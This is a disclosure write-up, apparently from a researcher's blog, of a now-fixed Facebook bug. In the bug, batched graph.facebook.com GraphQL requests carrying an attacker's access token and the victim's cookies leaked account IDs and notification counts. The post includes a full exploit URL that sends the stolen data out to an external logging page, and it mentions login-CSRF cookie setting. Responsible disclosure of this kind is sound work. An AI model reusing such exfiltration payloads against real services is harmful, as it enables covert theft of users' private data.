---
id: 627
title: 'Leaking Facebook user information to external websites / Setting some cookies values'
date: '2021-02-17T10:11:36+00:00'
author: qw
layout: post
guid: 'https://ysamm.com/?p=627'
wp_featherlight_disable:
    - ''
categories:
    - Uncategorized
---

**Description**

This bug could allow an attacker to leak Facebook user information to malicious individuals without user interaction. This bug occurs because certain GraphQL queries/mutation would return information based on the cookies of the user, if an attacker can force the victim to perform a request to <https://graph.facebook.com/> domain with his own access_token, the action (mutation/query) would be performed in the contest of his account however the logged-in user cookies will be sent along with the request.  
  
To defend against this type of attacks, the [graph.facebook.com](http://graph.facebook.com/) domain would only return data if no credentials were included ( Access-Control-Allow-Origin: \* ). To bypass this and get the returned data, an attacker could exploit the fact that [graph.facebook.com](http://graph.facebook.com/) allows batched requests via the batch parameter and allows the result of each operation to be included in another request. This would mean that the attacker can get the data from the first request and send it to his website with the data appended via scraping it via the API.

**Reproduction Steps**

Trying to exploit this, i looked for graphql queries or [graph.facebook.com](http://graph.facebook.com/) endpoints that would return data based on user cookies and i found a couple but i’m sure more exists. The attacker can exploits the account switching feature on Facebook website. Comet has a query which would return information about accounts that the current user can switch to (based on the sb cookie). This query would leak all accounts logged-in in the victim device before (info like user id,name,unread notifications count). The GraphQL query is with doc_id=3114557815333936. We would make the query using the attacker access_token, however the cookies of the victim would be fetched to get the information.

The request to [graph.facebook.com](http://graph.facebook.com/) domain would be something similar to this: (could be embedded in an img tag for example)

https://graph.facebook.com/?access_token=ATTACKER_ACCESS_TOKEN&amp;batch=\[{“method”:”POST”,”name”:”test”,”relative_url”:”graphql”,”body”:”doc_id=3114557815333936″},{“method”:”POST”,”relative_url”:”/”,”body”:”scrape=true&amp;id=https://ysamm.com/log.php?{result=test:$.data.viewer.device_switchable_accounts..user.id}”},{“method”:”POST”,”relative_url”:”/”,”body”:”scrape=true&amp;id=https://ysamm.com/log.php?{result=test:$.data.viewer.device_switchable_accounts..unread_notification_count}”}\]&amp;method=POST

Where ATTACKER_ACCESS_TOKEN is a first_party access token of an attacker account.  
doc_id=3114557815333936 is the id for the graphql query which would return the data.  
[https://ysamm.com/log.php](https://l.facebook.com/l.php?u=https%3A%2F%2Fysamm.com%2Flog.php%3Ffbclid%3DIwAR1vL721CKzF3UWxeH9GTfVAblnDxZ3erq6AS9dQPuLZhCxk3Tu7JSxD_WE&h=AT3FV3eztWCY1hybfF79TmXT71iR55cefzDnEZFXpkRklCQXkjNE16U5TvH1QtJLQzC6T2qvZxpEkkfPHH3UvI88zgSHHdMHfJRsPp4D8k0LYvRRchxdh9D2llQ47A)? is used for logging the response ( here we use URL scraping via API, we can use feed posting too)  
{result=test:$.data.viewer.device_switchable_accounts.\*.user.id} for example is the result from the first operation named “test” and would get us the user id

Few scenarios that i would like to mention that i’m not sure they’d work:

– Leaking data via datr cookie. Not sure what that cookie saves but i think it’s related to the device/location/browser.  
– Other queries than 3114557815333936 were found which would allow setting some cookies values (“dbln” and “i_user” cookies) which would allow login CSRFs  
– Batch requests via <https://graph.facebook.com/?batch> would return headers too. If cookies are embedded too along the access_token in these requests sent internally, then if the user session is old enough, we would get a set-cookie header in the response that would be returned to us. This attack would require a batch request embedded inside a batch request (to leak headers) however this is not currently possible by design (bypass wasn’t found)

**Timeline**

Oct 22, 2020— Report Sent   
Dec 29, 2020— Acknowledged by Facebook  
Jan 22, 2021— Fixed by Facebook  
Feb 1, 2021 — $2000 bounty awarded by Facebook.